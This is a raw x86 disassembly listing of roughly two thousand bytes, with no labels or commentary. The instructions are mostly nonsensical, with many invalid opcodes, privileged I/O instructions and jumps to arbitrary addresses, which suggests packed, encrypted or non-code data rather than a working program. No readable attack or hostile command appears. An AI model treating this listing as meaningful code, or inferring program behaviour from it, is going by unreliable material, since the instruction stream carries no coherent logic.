  41407f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414080:	lods   al,BYTE PTR ds:[esi]
  414081:	dec    edx
  414082:	pavgw  mm2,mm0
  414085:	sbb    esi,esp
  414087:	dec    bl
  414089:	or     al,0x95
  41408b:	loop   0x4140d7
  41408d:	mov    bh,0x9a
  41408f:	loope  0x41405c
  414091:	sub    BYTE PTR [edx+0x4f],ch
  414094:	push   cs
  414095:	lods   al,BYTE PTR ds:[esi]
  414096:	lods   al,BYTE PTR ds:[esi]
  414097:	out    dx,al
  414098:	fist   WORD PTR [esi-0x66]
  41409b:	jp     0x414106
  41409d:	inc    edx
  41409e:	or     DWORD PTR [ebx-0x7341fd76],edx
  4140a4:	(bad)  
  4140a5:	push   ebp
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	sub    ebp,ebp
  4140a9:	lods   eax,DWORD PTR ds:[esi]
  4140aa:	push   eax
  4140ab:	lods   al,BYTE PTR ds:[esi]
  4140ac:	xchg   esp,eax
  4140ad:	sub    BYTE PTR [eax],dh
  4140af:	add    al,0xa4
  4140b1:	jmp    0x41408a
  4140b3:	aas    
  4140b4:	in     eax,dx
  4140b5:	out    0xd1,eax
  4140b7:	adc    DWORD PTR [eax+0x292aba18],edi
  4140bd:	repnz stos BYTE PTR es:[edi],al
  4140bf:	outs   dx,BYTE PTR ds:[esi]
  4140c0:	shr    DWORD PTR [ebx],1
  4140c2:	push   esi
  4140c3:	mov    cs,WORD PTR [eax+0x7439d7e1]
  4140c9:	ret    
  4140ca:	fabs   
  4140cc:	mov    cl,0xda
  4140ce:	xor    ebx,esi
  4140d0:	mov    DWORD PTR [eax+0x337ed5b2],esi
  4140d6:	rol    DWORD PTR [edi+edx*1-0x3671772],0x61
  4140de:	test   DWORD PTR [esi+0x62],ebp
  4140e1:	hlt    
  4140e2:	(bad)  
  4140e3:	jmp    0x5bab671b
  4140e8:	jne    0x414085
  4140ea:	stos   DWORD PTR es:[edi],eax
  4140eb:	mov    ecx,0x8241982e
  4140f0:	pop    edi
  4140f1:	(bad)  
  4140f2:	jbe    0x4140dc
  4140f4:	mov    ss,edx
  4140f6:	mov    bl,0xb3
  4140f8:	push   ds
  4140f9:	pop    esp
  4140fa:	js     0x41407e
  4140fc:	arpl   WORD PTR [edx-0x14],bx
  4140ff:	imul   eax,eax,0xd9888a04
  414105:	aaa    
  414106:	sbb    al,0xac
  414108:	lea    edi,[ecx+edi*1-0xa]
  41410c:	aad    0x8e
  41410e:	inc    eax
  41410f:	jge    0x41411b
  414111:	scas   al,BYTE PTR es:[edi]
  414112:	in     al,dx
  414113:	repnz arpl WORD PTR [bx+di+0x8],bx
  414118:	xor    BYTE PTR [ecx-0x7a90360f],dl
  41411e:	push   DWORD PTR [ebp-0x49]
  414121:	js     0x4140be
  414123:	add    eax,0xe3044aff
  414128:	icebp  
  414129:	(bad)  
  41412b:	jno    0x4140fb
  41412d:	push   0x4f
  41412f:	dec    edi
  414130:	xor    BYTE PTR [ebp+0x17199e00],dh
  414136:	adc    ah,BYTE PTR [ecx+0x4dc0114b]
  41413c:	js     0x414174
  41413e:	sbb    edx,edi
  414140:	adc    eax,0x19c56f8c
  414145:	mov    cl,0x5a
  414147:	push   ebx
  414148:	sti    
  414149:	bound  edx,QWORD PTR [edi-0x561be3a2]
  41414f:	mov    edx,0x939c8c4e
  414154:	mov    edx,DWORD PTR [ebx-0x54d2d41b]
  41415a:	mov    ah,0x4a
  41415c:	ret    0x34c9
  41415f:	aaa    
  414160:	fstp   QWORD PTR [edx-0x7c]
  414163:	sbb    dh,ah
  414165:	cmp    edi,DWORD PTR [ebx-0x34998fcc]
  41416b:	(bad)  
  41416c:	xor    ebp,eax
  41416e:	adc    BYTE PTR [edi-0xb],bl
  414171:	(bad)  
  414173:	(bad)  
  414174:	clc    
  414175:	les    esi,FWORD PTR [esi]
  414177:	add    edx,edi
  414179:	add    al,0x79
  41417b:	mov    ds:0xa111fc72,al
  414180:	scas   al,BYTE PTR es:[edi]
  414181:	mov    DWORD PTR [edx],esi
  414183:	ret    0x90d0
  414186:	icebp  
  414187:	int    0x9b
  414189:	pop    ecx
  41418a:	ins    DWORD PTR es:[edi],dx
  41418b:	imul   ah
  41418d:	adc    eax,0x61a615f2
  414192:	sub    eax,DWORD PTR [ecx+0x31]
  414195:	daa    
  414196:	or     eax,0x49207a4d
  41419b:	mov    al,ds:0x492d51c
  4141a0:	sbb    bl,BYTE PTR [eax+ebp*4+0x4f]
  4141a4:	stos   BYTE PTR es:[edi],al
  4141a5:	add    BYTE PTR [ebx-0x616fba38],ah
  4141ab:	shl    DWORD PTR [edx+esi*2-0x65],0xb7
  4141b0:	sub    DWORD PTR [edi],eax
  4141b2:	dec    esp
  4141b3:	dec    ecx
  4141b4:	mov    al,ds:0x8f0aecbc
  4141b9:	js     0x41416d
  4141bb:	repz mov ebp,0x86164028
  4141c1:	rcl    BYTE PTR [ebx+edx*2],1
  4141c4:	jp     0x4141a6
  4141c6:	jge    0x414160
  4141c8:	(bad)  
  4141c9:	cmp    eax,0x6725422d
  4141ce:	lahf   
  4141cf:	cmp    eax,esp
  4141d1:	mov    BYTE PTR [eax-0x480db738],cl
  4141d7:	sub    eax,0x50a355d3
  4141dc:	repnz inc esi
  4141de:	daa    
  4141df:	push   edx
  4141e0:	or     edi,DWORD PTR [esi+0x4da1581c]
  4141e6:	(bad)  
  4141e7:	loopne 0x414181
  4141e9:	add    ch,bl
  4141eb:	push   ds
  4141ec:	cmp    DWORD PTR [edx+0x73],ebx
  4141ef:	dec    esi
  4141f0:	or     DWORD PTR [edi+0xa939185],ecx
  4141f6:	cli    
  4141f7:	pop    edx
  4141f8:	(bad)  
  4141f9:	ins    DWORD PTR es:[edi],dx
  4141fa:	ss daa 
  4141fc:	pop    ecx
  4141fd:	repz mov bh,0xde
  414200:	push   esp
  414201:	inc    ebp
  414202:	add    eax,0xcbf15b5f
  414207:	push   eax
  414208:	iret   
  414209:	push   cs
  41420a:	test   al,0x47
  41420c:	ja     0x414262
  41420e:	mov    WORD PTR [esi+0x1e],es
  414211:	mov    al,0xa6
  414213:	jne    0x414270
  414215:	nop
  414216:	and    edi,DWORD PTR [ecx+0x5a82fc8c]
  41421c:	int3   
  41421d:	loop   0x41428b
  41421f:	mov    ds:0x3e68fb0d,al
  414224:	dec    ecx
  414225:	add    BYTE PTR ds:0x8e21d206,0x1b
  41422c:	mov    dh,0xe3
  41422e:	ss jmp 0x4141fa
  414231:	fcom   QWORD PTR [ecx+0x71]
  414234:	xlat   BYTE PTR ds:[ebx]
  414235:	int3   
  414236:	gs popf 
  414238:	or     ecx,DWORD PTR [ecx-0x459d1a1d]
  41423e:	mov    ebp,0x55e4eeb0
  414243:	push   eax
  414244:	(bad)  
  414245:	ins    BYTE PTR es:[edi],dx
  414246:	cwde   
  414247:	adc    DWORD PTR [edi+0x4ebb6c49],ebx
  41424d:	loopne 0x4141f7
  41424f:	shl    al,0x3
  414252:	jge    0x4141ff
  414254:	das    
  414255:	jmp    0xf043a78d
  41425a:	call   0x7e0621ba
  41425f:	xor    BYTE PTR [eax-0x56],0xea
  414263:	imul   esi,DWORD PTR [edx+0x56],0xb473bac0
  41426a:	test   BYTE PTR [edx],dh
  41426c:	mov    ds:0x699b438d,al
  414271:	cmp    esp,esi
  414273:	add    al,0xc9
  414275:	mov    eax,0x76fbebb6
  41427a:	xchg   ecx,eax
  41427b:	repz in al,dx
  41427d:	adc    esp,ecx
  41427f:	in     al,dx
  414280:	pop    esp
  414281:	sub    eax,0xa07ff7ad
  414286:	push   esp
  414287:	loope  0x414209
  414289:	xchg   bl,ch
  41428b:	sar    ah,0x80
  41428e:	lock adc DWORD PTR [ecx-0x9bd7e08],ebx
  414295:	ficomp DWORD PTR [esi-0x1]
  414298:	mov    bl,0x86
  41429a:	adc    ah,dl
  41429c:	sbb    ecx,eax
  41429e:	push   edi
  41429f:	inc    esp
  4142a0:	mov    al,0xd5
  4142a2:	lds    edx,FWORD PTR [ebx-0x28]
  4142a5:	rol    DWORD PTR [edx+0x71],cl
  4142a8:	test   BYTE PTR ds:0x57c3b621,cl
  4142ae:	nop
  4142af:	call   0xbabf:0x2c0d278
  4142b6:	es aas 
  4142b8:	(bad)  
  4142ba:	and    bl,al
  4142bc:	push   0x6d
  4142be:	clc    
  4142bf:	add    ah,BYTE PTR [edi-0x36]
  4142c2:	xor    al,0x28
  4142c4:	sub    al,0xa6
  4142c6:	push   ebx
  4142c7:	push   0xf
  4142c9:	add    eax,0x2a11668f
  4142ce:	mov    ?,WORD PTR [eax+eiz*1]
  4142d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142d2:	fbstp  TBYTE PTR [esi-0x7f]
  4142d5:	pop    edi
  4142d6:	(bad)  
  4142d7:	cmp    bh,BYTE PTR [ebx]
  4142d9:	out    0x7f,eax
  4142db:	pop    ecx
  4142dc:	inc    esi
  4142dd:	inc    edx
  4142de:	std    
  4142df:	push   edx
  4142e0:	popf   
  4142e1:	mov    ah,0xfe
  4142e3:	dec    ebp
  4142e4:	add    DWORD PTR [ebx+0x3e56df40],esp
  4142ea:	cmp    ah,BYTE PTR [ecx-0x5e45b310]
  4142f0:	dec    esp
  4142f1:	retf   
  4142f2:	dec    edi
  4142f3:	lea    edi,[eax+edx*4]
  4142f6:	adc    eax,0xccb534c3
  4142fb:	(bad)  [eax+0x30964ea7]
  414301:	jp     0x4142c8
  414303:	sub    DWORD PTR [edx+0x3a570e82],ebx
  414309:	pop    eax
  41430a:	test   DWORD PTR [eax-0x5ed5b341],ebp
  414310:	lea    ebx,[eax+edx*4]
  414313:	clc    
  414314:	pop    es
  414315:	repz enter 0xdcb7,0xab
  41431a:	xlat   BYTE PTR ds:[ebx]
  41431b:	outs   dx,DWORD PTR ds:[esi]
  41431c:	sub    eax,DWORD PTR [edi+0x3c]
  41431f:	xchg   edi,eax
  414320:	js     0x414348
  414322:	es push cs
  414324:	pop    ss
  414325:	ret    
  414326:	jo     0x414392
  414328:	fld    DWORD PTR [ebp+eax*1-0x50]
  41432c:	std    
  41432d:	inc    edx
  41432e:	mov    edi,DWORD PTR [eax]
  414330:	je     0x4143aa
  414332:	adc    al,dl
  414334:	pop    edi
  414335:	aam    0xe6
  414337:	fadd   DWORD PTR [edx+0x3d]
  41433a:	fdivr  DWORD PTR [esi+ebp*4-0x28]
  41433e:	(bad)  
  414340:	fmul   DWORD PTR [eax+0xcdc3910]
  414346:	mov    ds:0x1c8f1e7d,al
  41434b:	fnstsw WORD PTR [edi+0x3f]
  41434e:	mov    cl,0xa1
  414350:	clc    
  414351:	jnp    0x4142fa
  414353:	cmp    DWORD PTR [ebx-0x1],edi
  414356:	stc    
  414357:	jns    0x414350
  414359:	adc    ah,BYTE PTR [ebx]
  41435b:	xor    eax,0x8843e0ff
  414360:	fcmovbe st,st(4)
  414362:	cdq    
  414363:	pop    ecx
  414364:	ror    DWORD PTR ds:0xd836cc8,1
  41436a:	xchg   ebp,eax
  41436b:	aad    0xea
  41436d:	xor    ebx,DWORD PTR [esi+0x34]
  414370:	sbb    bl,0xe7
  414373:	xor    dh,bl
  414375:	sti    
  414376:	jns    0x4143b6
  414378:	dec    edi
  414379:	cmp    BYTE PTR [ecx],0xd1
  41437c:	lods   al,BYTE PTR ds:[esi]
  41437d:	push   ds
  41437e:	jae    0x4143a0
  414380:	stc    
  414381:	sub    DWORD PTR ds:0x8ad3de98,0x97d4a58e
  41438b:	pop    es
  41438c:	cli    
  41438d:	shl    ecx,0x2f
  414390:	inc    edi
  414391:	(bad)  
  414392:	jle    0x414326
  414394:	lods   eax,DWORD PTR ds:[esi]
  414395:	pop    ebp
  414396:	fnstenv [edi-0x1803e376]
  41439c:	hlt    
  41439d:	and    al,0x5f
  41439f:	add    BYTE PTR [esi],bh
  4143a1:	mov    ebx,0x5bff2d8d
  4143a6:	(bad)  [ebp+edi*8+0x4e]
  4143aa:	pop    edx
  4143ab:	cmc    
  4143ac:	(bad)  
  4143ad:	pusha  
  4143ae:	and    eax,0x802a4fc9
  4143b3:	fmul   QWORD PTR [ebx+0x39]
  4143b6:	sbb    cl,ch
  4143b8:	dec    ecx
  4143b9:	add    edi,esi
  4143bb:	add    edx,DWORD PTR [ebx]
  4143bd:	out    dx,al
  4143be:	adc    eax,0xb2ef0ef4
  4143c3:	inc    BYTE PTR [ecx-0x58]
  4143c6:	pop    edi
  4143c7:	test   ecx,ecx
  4143c9:	pop    esi
  4143ca:	lahf   
  4143cb:	fcmovb st,st(1)
  4143cd:	jns    0x4143f2
  4143cf:	lock fiadd WORD PTR [ecx+edx*8+0x5bf2d39f]
  4143d7:	stc    
  4143d8:	fsubr  st,st(5)
  4143da:	push   eax
  4143db:	cli    
  4143dc:	add    al,0xf0
  4143de:	(bad)  
  4143df:	pop    esi
  4143e0:	or     bh,BYTE PTR [ebx]
  4143e2:	dec    ebp
  4143e3:	out    dx,eax
  4143e4:	retf   0x35d8
  4143e7:	xchg   cl,bh
  4143e9:	test   BYTE PTR [edi-0x1d],al
  4143ec:	les    edi,FWORD PTR [ecx+eax*8+0x7880f07a]
  4143f3:	cmp    al,0x6a
  4143f5:	ins    BYTE PTR es:[edi],dx
  4143f6:	pop    es
  4143f7:	scas   eax,DWORD PTR es:[edi]
  4143f8:	dec    edi
  4143f9:	inc    esi
  4143fa:	or     dh,BYTE PTR ds:0x6a234f5e
  414400:	lds    esp,FWORD PTR [edx+eax*1+0x4b49d5ea]
  414407:	add    eax,0x8a356bc9
  41440c:	mov    al,0x15
  41440e:	data16 jne 0x41445c
  414411:	dec    ebp
  414412:	rol    ch,1
  414414:	lods   al,BYTE PTR ds:[esi]
  414415:	cmp    al,0x60
  414417:	lods   al,BYTE PTR ds:[esi]
  414418:	lds    edx,FWORD PTR [ebp+0x28]
  41441b:	jmp    0x494a411d
  414420:	xchg   ecx,eax
  414421:	sbb    BYTE PTR [ebx],0xc2
  414424:	mov    ss,WORD PTR [ebp+0x32]
  414427:	jmp    0x11a6:0x8d624b0d
  41442e:	int3   
  41442f:	mov    al,ds:0xc3464681
  414434:	jg     0x414448
  414436:	lods   al,BYTE PTR ds:[esi]
  414437:	push   es
  414438:	add    al,0x8f
  41443a:	xlat   BYTE PTR ds:[ebx]
  41443b:	jmp    0x171b:0x65ac0ed1
  414442:	sub    ah,BYTE PTR [ebx-0x2d686616]
  414448:	sub    DWORD PTR [eax+0x25],esi
  41444b:	push   edi
  41444c:	jb     0x4143fc
  41444e:	jmp    0x41445d
  414450:	fisubr WORD PTR [ebp+0x32]
  414453:	cmp    al,0x8c
  414455:	xchg   DWORD PTR [esi],ebx
  414457:	adc    BYTE PTR [esi-0x57],ah
  41445a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41445b:	in     eax,dx
  41445c:	fldcw  WORD PTR [ebx+ecx*1+0x2e803699]
  414463:	stos   DWORD PTR es:[edi],eax
  414464:	aad    0xc
  414466:	mov    ds:0x3aebc4b5,al
  41446b:	fist   WORD PTR [ecx+0x3ae36be5]
  414472:	sbb    al,0x8f
  414474:	stos   DWORD PTR es:[edi],eax
  414475:	lods   al,BYTE PTR ds:[esi]
  414476:	shl    DWORD PTR [esi-0x23ce4198],1
  41447c:	leave  
  41447d:	imul   edi,DWORD PTR [ebx+0x555e0f54],0xc8429cfa
  414487:	push   0xfbba2b8c
  41448c:	xchg   ecx,eax
  41448d:	retf   0xba41
  414490:	xchg   edx,eax
  414491:	js     0x41444a
  414493:	fwait
  414494:	jne    0x41445e
  414496:	pop    edx
  414497:	ja     0x4144ff
  414499:	shl    dh,0x26
  41449c:	sbb    al,0x9c
  41449e:	sbb    al,0xfe
  4144a0:	add    al,0x5b
  4144a2:	mov    ah,0x34
  4144a4:	arpl   WORD PTR ds:0xc2175ce1,si
  4144aa:	dec    esi
  4144ab:	pop    ss
  4144ac:	shl    DWORD PTR [ecx],0x9e
  4144af:	(bad)  
  4144b0:	cmp    ebx,esp
  4144b2:	(bad)  
  4144b3:	pop    esp
  4144b4:	or     DWORD PTR [edi+0x43],ecx
  4144b7:	pop    es
  4144b8:	fs mov esp,0xef551cb5
  4144be:	enter  0xc3fd,0xb1
  4144c2:	push   ss
  4144c3:	push   ecx
  4144c4:	push   cs
  4144c5:	fsub   QWORD PTR [eax+0x58]
  4144c8:	fld    DWORD PTR [edi-0x35]
  4144cb:	xchg   BYTE PTR [edi+0x35],al
  4144ce:	dec    eax
  4144cf:	ins    DWORD PTR es:[di],dx
  4144d1:	push   ds
  4144d2:	fs ins DWORD PTR es:[edi],dx
  4144d4:	shl    dh,0x11
  4144d7:	jmp    0x41451a
  4144d9:	jnp    0x4144f8
  4144db:	jns    0x414493
  4144dd:	and    BYTE PTR [ebx],0x5f
  4144e0:	mov    esi,edx
  4144e2:	add    edx,ebx
  4144e4:	imul   eax,DWORD PTR [ecx+eax*2+0x75],0x195ec0bd
  4144ec:	xor    al,0xb8
  4144ee:	loope  0x41455f
  4144f0:	cli    
  4144f1:	clc    
  4144f2:	mov    al,es:0xcb52f111
  4144f8:	test   al,0xf
  4144fa:	test   DWORD PTR [ebx+0x30863280],0xb52f3702
  414504:	test   BYTE PTR [eax-0x669d54da],bh
  41450a:	jmp    0x66e4ba18
  41450f:	jp     0x4144e3
  414511:	mov    esi,0x7c21b3eb
  414516:	aaa    
  414517:	dec    edi
  414518:	jl     0x4144fd
  41451a:	outs   dx,BYTE PTR ds:[esi]
  41451b:	out    0xaf,eax
  41451d:	mov    dh,BYTE PTR [edx]
  41451f:	int3   
  414520:	rol    DWORD PTR [ecx+edx*4-0x52396384],cl
  414527:	or     BYTE PTR [esi],al
  414529:	sbb    bh,0x8f
  41452c:	sub    eax,0x634083bf
  414531:	inc    edx
  414532:	popf   
  414533:	scas   eax,DWORD PTR es:[edi]
  414534:	mov    cl,0xd9
  414536:	dec    eax
  414537:	pop    ecx
  414538:	sbb    al,0x62
  41453a:	nop
  41453b:	xor    al,0x14
  41453d:	jge    0x4144ec
  41453f:	dec    esp
  414540:	add    DWORD PTR [edi-0xe],ebp
  414543:	or     al,BYTE PTR [eax+0x71918053]
  414549:	test   al,0x1b
  41454b:	pop    ds
  41454c:	cmp    bh,0xd4
  41454f:	jbe    0x4145cb
  414551:	sub    al,0x2b
  414553:	test   DWORD PTR [esi],edi
  414555:	call   0xee64:0x610ed2ba
  41455c:	in     eax,0x27
  41455e:	fnstenv [edi-0x73fe40d7]
  414564:	and    eax,0x315d0ae0
  414569:	or     bl,BYTE PTR [esi+ebp*2-0x7a3f47db]
  414570:	jg     0x414507
  414572:	jb     0x4145b5
  414574:	and    ch,BYTE PTR [eax]
  414576:	sbb    al,0xf
  414578:	jbe    0x414568
  41457a:	jnp    0x414516
  41457c:	mov    bl,0xa6
  41457e:	cmc    
  41457f:	push   0x5abb9061
  414584:	cmp    dh,BYTE PTR [esi+edx*8+0x24bbad3f]
  41458b:	jle    0x4145a4
  41458d:	arpl   WORD PTR [esi-0x64629a7b],si
  414593:	pop    ds
  414594:	pop    ds
  414595:	sahf   
  414596:	test   BYTE PTR [ebp+0x615c27c9],bl
  41459c:	push   cs
  41459d:	xchg   esi,edx
  41459f:	xor    cl,BYTE PTR [edi]
  4145a1:	mov    ecx,0x90847466
  4145a6:	and    DWORD PTR [edx-0x8],edi
  4145a9:	js     0x4145b6
  4145ab:	aas    
  4145ac:	outs   dx,BYTE PTR ds:[esi]
  4145ad:	pop    ds
  4145ae:	cmp    dl,ah
  4145b0:	aaa    
  4145b1:	cld    
  4145b2:	add    eax,DWORD PTR [ecx*2+0x4ae2cdb9]
  4145b9:	mov    dh,0x34
  4145bb:	jnp    0x414608
  4145bd:	mov    esi,0xe31a86fe
  4145c2:	out    dx,al
  4145c3:	int3   
  4145c4:	mov    BYTE PTR [ebx+0x68],bl
  4145c7:	icebp  
  4145c8:	hlt    
  4145c9:	mov    ds:0xcee76c3b,eax
  4145ce:	sbb    cl,dl
  4145d0:	jo     0x414582
  4145d2:	out    dx,eax
  4145d3:	(bad)  [ebx+0x732354d0]
  4145d9:	cs cdq 
  4145db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145dc:	or     cl,BYTE PTR [ebx-0x35]
  4145df:	icebp  
  4145e0:	mov    ebp,0x113d2bfd
  4145e5:	and    DWORD PTR [ebp-0x4879c159],edi
  4145eb:	sbb    al,0x3e
  4145ed:	xchg   al,ah
  4145ef:	cli    
  4145f0:	stc    
  4145f1:	fdiv   DWORD PTR [esi-0x44]
  4145f4:	inc    ebx
  4145f5:	rcr    dl,0xcb
  4145f8:	gs repnz mov al,0x57
  4145fc:	fnstenv [eax]
  4145fe:	jo     0x41460b
  414600:	jmp    0x1bb20bd1
  414605:	or     BYTE PTR [ecx*4+0x99d6695],bh
  41460c:	sub    BYTE PTR [edi+0x73],bl
  41460f:	inc    esp
  414610:	sbb    al,0x55
  414612:	mov    edx,DWORD PTR [esi+0x1d4a8486]
  414618:	push   esp
  414619:	scas   eax,DWORD PTR es:[edi]
  41461a:	ds iret 
  41461c:	pushf  
  41461d:	mov    ebx,0xa425c8be
  414622:	or     edi,esi
  414624:	and    DWORD PTR [edi+0x35523b93],ebp
  41462a:	(bad)  
  41462b:	lahf   
  41462c:	repnz xchg edx,eax
  41462e:	xor    eax,edx
  414630:	test   BYTE PTR [edi],al
  414632:	(bad)  [ebx]
  414634:	test   DWORD PTR [ebx+0x1d],edx
  414637:	adc    DWORD PTR [ecx],eax
  414639:	mov    ah,dh
  41463b:	xchg   edi,eax
  41463c:	lods   al,BYTE PTR ds:[esi]
  41463d:	pop    edi
  41463e:	sbb    esp,eax
  414640:	shl    BYTE PTR [esi-0x1cb7fedb],0x40
  414647:	pop    ecx
  414648:	inc    esp
  414649:	nop
  41464a:	shr    DWORD PTR [esi+edx*8-0x3a419bab],cl
  414651:	push   esi
  414652:	jge    0x4145f5
  414654:	fist   DWORD PTR [eax]
  414656:	out    0xe9,al
  414658:	or     BYTE PTR [edx-0x13d26ca2],dl
  41465e:	pop    ss
  41465f:	leave  
  414660:	dec    ecx
  414661:	mov    bl,bl
  414663:	push   0xd1de63b2
  414668:	inc    ebp
  414669:	pushf  
  41466a:	xor    ch,BYTE PTR [ecx+0x645dad31]
  414670:	sub    ebp,DWORD PTR [eax+edx*8-0x53bf04ef]
  414677:	inc    edi
  414678:	sub    ch,bh
  41467a:	push   esp
  41467b:	ret    0xbe57
  41467e:	int    0xf7
  414680:	data16 jns 0x414616
  414683:	jae    0x4146b5
  414685:	xor    al,0xc
  414687:	(bad)  
  414688:	add    BYTE PTR [edi-0x4c],dh
  41468b:	dec    eax
  41468c:	retf   
  41468d:	out    dx,eax
  41468e:	mov    edi,0x111a1775
  414693:	or     bh,BYTE PTR [edi+edx*2]
  414696:	scas   eax,DWORD PTR es:[edi]
  414697:	iret   
  414698:	xor    DWORD PTR [ebx],ebx
  41469a:	scas   al,BYTE PTR es:[edi]
  41469b:	(bad)  
  41469c:	pop    ecx
  41469d:	iret   
  41469e:	pop    edi
  41469f:	mov    dl,0xdb
  4146a1:	sbb    eax,0x5ccfac42
  4146a6:	iret   
  4146a7:	(bad)  
  4146a8:	mov    esi,0x51c23445
  4146ad:	inc    edi
  4146ae:	jle    0x414725
  4146b0:	push   ebx
  4146b1:	xchg   edi,eax
  4146b2:	int3   
  4146b3:	pop    ss
  4146b4:	mov    ebp,0xeca9096f
  4146b9:	inc    eax
  4146ba:	lahf   
  4146bb:	repz jns 0x4146a2
  4146be:	xchg   esp,eax
  4146bf:	xlat   BYTE PTR ds:[ebx]
  4146c0:	sub    DWORD PTR [ebp-0x29],0xfffffff3
  4146c4:	mov    ch,0xa4
  4146c6:	xchg   ecx,eax
  4146c7:	lds    esp,FWORD PTR [ebx-0x72]
  4146ca:	sti    
  4146cb:	sub    DWORD PTR [ebp+ebx*4-0x48],0x5a86669f
  4146d3:	fild   WORD PTR ds:0xcc93b3c1
  4146d9:	and    eax,0xa5d31c60
  4146de:	push   eax
  4146df:	xchg   esp,eax
  4146e0:	(bad)  
  4146e1:	loopne 0x41470f
  4146e3:	and    DWORD PTR [ecx+0x29228dbd],ebp
  4146e9:	push   ecx
  4146ea:	push   0xa8c269b6
  4146ef:	popa   
  4146f0:	mov    ds:0xa78edd80,eax
  4146f5:	lds    ecx,FWORD PTR [ebx]
  4146f7:	jmp    0x414699
  4146f9:	mov    dh,0xf1
  4146fb:	mov    al,ds:0xf318ec42
  414700:	shl    BYTE PTR [ebx-0x244b9132],1
  414706:	idiv   BYTE PTR [eax]
  414708:	xor    eax,DWORD PTR [ecx+eax*1-0x4e]
  41470c:	xor    esi,esi
  41470e:	fwait
  41470f:	(bad)  
  414710:	mov    ah,0x74
  414712:	adc    BYTE PTR gs:[ecx+edx*2],0xe2
  414717:	sub    dh,bh
  414719:	adc    dh,ch
  41471b:	cdq    
  41471c:	add    edx,DWORD PTR [esi+0x6d]
  41471f:	popa   
  414720:	push   0xffffffab
  414722:	sub    DWORD PTR [edx],esp
  414724:	push   ecx
  414725:	ins    BYTE PTR es:[edi],dx
  414726:	and    al,al
  414728:	ds inc edx
  41472a:	push   ds
  41472b:	push   ecx
  41472c:	xor    eax,DWORD PTR [ecx+ebp*1]
  41472f:	adc    al,BYTE PTR [edx-0x624d4ec6]
  414735:	sub    al,BYTE PTR [eax]
  414737:	cmp    ebp,DWORD PTR [eax+edi*2]
  41473a:	push   0x6a474af7
  41473f:	push   ds
  414740:	imul   ecx,DWORD PTR es:[ebx+0x6313e2b4],0xa18e29b5
  41474b:	cmp    ah,bl
  41474d:	sbb    DWORD PTR [ecx-0x3bae9f51],esp
  414753:	xchg   ecx,eax
  414754:	rcr    BYTE PTR [ecx+0x1eb5297c],1
  41475a:	int3   
  41475b:	scas   al,BYTE PTR es:[edi]
  41475c:	adc    DWORD PTR [esi],edx
  41475e:	xchg   esp,eax
  41475f:	cwde   
  414760:	call   0xd2484187
  414765:	es fwait
  414767:	rcr    BYTE PTR ds:0x8c4b0e3b,cl
  41476d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41476e:	test   DWORD PTR [edi-0x5a],ebx
  414771:	or     al,0xfe
  414773:	inc    ebx
  414774:	rcr    DWORD PTR [ecx],1
  414776:	cmp    BYTE PTR [ecx+edx*2-0x36],ah
  41477a:	jmp    0x75d75056
  41477f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414780:	xchg   ecx,eax
  414781:	dec    ebp
  414782:	inc    eax
  414783:	pop    edx
  414784:	mov    al,ds:0x5d556552
  414789:	int3   
  41478a:	fucomi st,st(1)
  41478c:	push   ss
  41478d:	test   cl,dl
  41478f:	pop    ebp
  414790:	mov    ds:0xd9381c72,eax
  414795:	arpl   WORD PTR [esi-0x7052fc5d],sp
  41479b:	js     0x41480b
  41479d:	mov    dh,0xc9
  41479f:	mov    esp,0xda424bcf
  4147a4:	adc    cl,BYTE PTR [edx+0x1d3af58b]
  4147aa:	jge    0x4147ae
  4147ac:	enter  0xe07,0x19
  4147b0:	or     al,0x62
  4147b2:	push   ebx
  4147b3:	xlat   BYTE PTR ds:[ebx]
  4147b4:	xchg   ebx,eax
  4147b5:	inc    ecx
  4147b6:	pop    ds
  4147b7:	int3   
  4147b8:	push   ecx
  4147b9:	rcr    BYTE PTR ds:0x380902cc,cl
  4147bf:	sub    edx,DWORD PTR [ecx]
  4147c1:	outs   dx,DWORD PTR ds:[esi]
  4147c2:	xchg   ebp,eax
  4147c3:	jo     0x414790
  4147c5:	test   BYTE PTR [edi+0x4b],dh
  4147c8:	shl    eax,0xa2
  4147cb:	dec    edi
  4147cc:	mov    esp,0x1afc6867
  4147d1:	pop    edx
  4147d2:	jbe    0x414820
  4147d4:	xchg   ecx,eax
  4147d6:	or     ch,0x3f
  4147d9:	aam    0x24
  4147db:	mov    ah,0xb1
  4147dd:	mov    al,0xf
  4147df:	dec    esi
  4147e0:	push   ebp
  4147e1:	xor    ah,ah
  4147e3:	setle  BYTE PTR [ebx]
  4147e6:	leave  
  4147e7:	(bad)  
  4147e9:	xchg   esi,eax
  4147ea:	in     al,0x55
  4147ec:	mov    bh,0x82
  4147ee:	jp     0x414809
  4147f0:	lock mov ah,0xa0
  4147f3:	mov    eax,ds:0x106bf78e
  4147f8:	fadd   QWORD PTR [edx+0x18]
  4147fb:	lods   al,BYTE PTR ds:[esi]
  4147fc:	pop    ebx
  4147fd:	and    eax,0x84ae805
  414802:	pop    eax
  414803:	sub    DWORD PTR ds:0x2024fe97,edi
  414809:	adc    eax,0xe50c1296
  41480e:	es xor edx,edx
  414811:	add    DWORD PTR es:[edi+0x321adade],0xfffffffb
  414819:	sub    ch,BYTE PTR [ebp+0x5b]
  41481c:	xor    al,0xe0
  41481e:	mov    ds:0xd289111,al
  414823:	mov    BYTE PTR ds:0x10b4e5a1,0xed
  41482a:	mov    dh,0x91
  41482c:	pop    esp
  41482d:	data16 (bad) 
  41482f:	les    ebp,FWORD PTR [edx]
  414831:	test   BYTE PTR [edx+0xf2a25a],dh
  414837:	cld    
  414838:	data16 mov WORD PTR [ebx-0x64f3f2cb],?
  41483f:	stos   BYTE PTR es:[edi],al
  414840:	ret    0x382e
  414843:	xor    DWORD PTR [ecx+0x10],ecx
  414846:	out    dx,eax
  414847:	lock mov eax,ds:0x6ed92ccb
  41484d:	cdq    
  41484e:	dec    edx
  41484f:	push   esp
  414850:	mov    bh,0x2c
  414852:	sar    DWORD PTR [ecx+0x50],cl
  414855:	lods   eax,DWORD PTR ds:[esi]
  414856:	fwait
  414857:	cli    
  414858:	inc    esp
  414859:	clc    
  41485a:	call   0xc6e2:0xe325162e
  414861:	jge    0x414895
